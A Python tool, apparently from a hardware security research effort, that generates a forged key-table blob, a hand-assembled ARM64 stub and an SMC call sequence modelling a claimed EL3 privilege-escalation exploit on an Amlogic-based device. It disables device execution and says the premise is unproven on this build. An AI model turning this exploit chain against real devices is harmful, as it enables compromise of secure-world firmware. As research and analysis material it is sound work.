#!/usr/bin/env python3
"""round61: offline predictor for the A113X EL3 port claimed for Aquaman.

Generates the malicious C1 blob and the SMC sequence on paper, using the real
Aquaman addresses recovered in earlier rounds. It never talks to a device.

The chain being modelled is the internet claim (A113X/AXG): SMC 0x82000069
parse_param_sector leaves g_keys_count stale, a key_entry above index 64
overlaps param_sector_decrypted, the forged value_ptr turns SMC 0x82000062
into an EL3 write, and 0x820000ff passes X1..X4 raw as a call4. On Aquaman
0x69 is a scalar NOTIFY_EX from init (round22 04, round59 01), so the premise
is already contradicted on the BL33 side. No BL31 plaintext was obtained in
round61, so the EL3 handler could not be diffed either. This script is a
prediction artifact only: `run` is refused.

Usage:
    python3 tools/round61_port_predict.py generate
    python3 tools/round61_port_predict.py plan
"""
import hashlib
import json
import struct
import sys

# Aquaman ground truth (BL33 live + reports), not A113X values.
C1_IN = 0x05000000           # SMC 0x23 GET_STORAGE_IN_BASE
C2_OUT = 0x05040000          # SMC 0x24 GET_STORAGE_OUT_BASE
BLOCK = 0x05080000           # SMC 0x25 GET_STORAGE_BLOCK_BASE
BLOCK_SZ = 0x40000           # SMC 0x27 GET_STORAGE_BLOCK_SIZE
SMC_STUB = 0x37E8BBA0        # bare `smc #0; ret`
WRAP_FF = 0x37E19EA8         # AML_DATA_PROCESS wrapper
WRAP_69 = 0x37E8BCFC         # NOTIFY_EX wrapper (scalar only)
WRAP_62 = 0x37E8BD10         # low C1 writer (keyman write path)
SHAREMEM_FLAG = 0x37FBDE50
STUB_BASE = 0x37800000       # MREAD-visible scratch for the injected stub
SENTINEL = 0x37800800        # MREAD-visible scratch, cheap write discriminator

ID_NOTIFY = 0x82000069
ID_WRITE = 0x82000062
ID_DATA = 0x820000FF

NAME = b"sn2"                # one of the three keys that actually read on device
KEY_ENTRY_SZ = 0x20          # ASSUMED from the A113X write-up, NOT Aquaman ground truth
FORGE_INDEX = 64             # first index overlapping param_sector_decrypted
FORGE_LEN = 0x10


def movz(rd, imm16, hw=0):
    return 0xD2800000 | (hw << 21) | (imm16 << 5) | rd


def movk(rd, imm16, hw=0):
    return 0xF2800000 | (hw << 21) | (imm16 << 5) | rd


def build_reg(rd, value):
    halves = [(value >> (16 * i)) & 0xFFFF for i in range(4)]
    nz = [i for i, h in enumerate(halves) if h]
    if not nz:
        return [movz(rd, 0)]
    out = [movz(rd, halves[nz[0]], nz[0])]
    return out + [movk(rd, halves[i], i) for i in nz[1:]]


def c1_blob():
    """C1 layout is Aquaman-exact (round23/04 4.1); the TLV inside is assumed."""
    # key_entry array: FORGE_INDEX entries, the last one forged.
    entries = bytearray()
    for i in range(FORGE_INDEX + 1):
        e = bytearray(KEY_ENTRY_SZ)
        struct.pack_into("<I", e, 0x00, i)            # assumed key id
        if i == FORGE_INDEX:
            struct.pack_into("<Q", e, 0x08, SENTINEL)  # assumed value_ptr
            struct.pack_into("<I", e, 0x10, FORGE_LEN) # assumed length
        entries += e
    # Aquaman C1 framing: namelen, datalen, flags=0, name, data.
    return (struct.pack("<III", len(NAME), len(entries), 0)
            + NAME + bytes(entries))


def stub():
    """x0=id, x1..x4 = claimed raw args; store x0..x3 to the sentinel page."""
    words = []
    for rd, val in ((0, ID_DATA), (1, ID_NOTIFY), (2, C1_IN),
                    (3, len(c1_blob())), (4, 0)):
        words += build_reg(rd, val)
    bl_pos = len(words)
    off = WRAP_FF - (STUB_BASE + 4 * bl_pos)
    assert off % 4 == 0 and -0x4000000 <= off < 0x4000000
    words.append(0x94000000 | ((off // 4) & 0x03FFFFFF))
    words.append(movz(5, SENTINEL & 0xFFFF))
    words.append(movk(5, (SENTINEL >> 16) & 0xFFFF, 1))
    words.append(0xA9000480)          # stp x0,x1,[x5]
    words.append(0xA9010C82)          # stp x2,x3,[x5,#0x10]
    words.append(0xD65F03C0)          # ret
    return b"".join(struct.pack("<I", w) for w in words)


def sequence():
    return [
        {"step": 1, "smc": hex(ID_NOTIFY), "wrapper": hex(WRAP_69),
         "regs": {"x0": hex(ID_NOTIFY), "x1": "scalar (Aquaman: NOTIFY_EX)"},
         "intent": "claimed parse trigger; on Aquaman this is a scalar init notify"},
        {"step": 2, "smc": hex(ID_WRITE), "wrapper": hex(WRAP_62),
         "c1": hex(C1_IN), "c2": hex(C2_OUT),
         "intent": "stage forged key_entry TLV via C1, issue STORAGE_WRITE"},
        {"step": 3, "smc": hex(ID_DATA), "wrapper": hex(WRAP_FF),
         "regs": {"x0": hex(ID_DATA), "x1": hex(ID_NOTIFY),
                  "x2": hex(C1_IN), "x3": hex(len(c1_blob())), "x4": "0"},
         "intent": "claimed call4 into EL3 with X1..X4 raw"},
    ]


def oracle():
    return {
        "target": hex(SENTINEL),
        "before": "MREAD 16 bytes, expect fixed sentinel pattern",
        "after": "MREAD 16 bytes; change == EL3 wrote to host-chosen NS RAM",
        "risk": "scratch RAM only, no flash/efuse/env, no boot; no brick path",
        "usable": True,
        "but": "premise unproven: 0x69 is scalar on Aquaman and BL31 layout unknown",
    }


def plan():
    return {
        "addresses": {"C1_IN": hex(C1_IN), "C2_OUT": hex(C2_OUT),
                      "BLOCK": hex(BLOCK), "BLOCK_SZ": hex(BLOCK_SZ),
                      "SHAREMEM_FLAG": hex(SHAREMEM_FLAG),
                      "SMC_STUB": hex(SMC_STUB), "WRAP_FF": hex(WRAP_FF),
                      "WRAP_69": hex(WRAP_69), "WRAP_62": hex(WRAP_62)},
        "c1_blob_len": len(c1_blob()),
        "c1_blob_sha256": hashlib.sha256(c1_blob()).hexdigest(),
        "assumptions": {
            "KEY_ENTRY_SZ": KEY_ENTRY_SZ, "FORGE_INDEX": FORGE_INDEX,
            "value_ptr_offset": 8, "len_offset": 0x10,
            "source": "A113X write-up only; NOT verified on Aquaman BL31",
        },
        "sequence": sequence(),
        "oracle": oracle(),
        "device_execution_proposed": False,
        "reason": "0x69 scalar on this build; no BL31 plaintext to locate "
                  "parse_storage/g_platform_ops; no oracle for EL3-only state",
    }


def main():
    a = sys.argv[1:] or ["generate"]
    cmd = a[0]
    if cmd == "generate":
        b = c1_blob()
        print("C1 blob len=%d sha256=%s" % (len(b), hashlib.sha256(b).hexdigest()))
        for i in range(0, min(len(b), 0x80), 16):
            print("  %08x  %s" % (i, b[i:i + 16].hex(" ")))
        print("forge entry @ 0x%x (index %d):" %
              (0x0C + len(NAME) + FORGE_INDEX * KEY_ENTRY_SZ, FORGE_INDEX))
        e = b[0x0C + len(NAME) + FORGE_INDEX * KEY_ENTRY_SZ:]
        print("  " + e[:KEY_ENTRY_SZ].hex(" "))
        s = stub()
        print("stub len=%d sha256=%s" % (len(s), hashlib.sha256(s).hexdigest()))
        print("  " + s.hex(" "))
    elif cmd == "plan":
        print(json.dumps(plan(), indent=2))
    elif cmd == "run":
        sys.exit("REFUSED: round61 is prediction-only. No device execution: "
                 "0x69 is scalar on Aquaman and no BL31 plaintext exists to "
                 "locate the parse handler or g_platform_ops.")
    else:
        sys.exit(__doc__)
    return 0


if __name__ == "__main__":
    sys.exit(main())
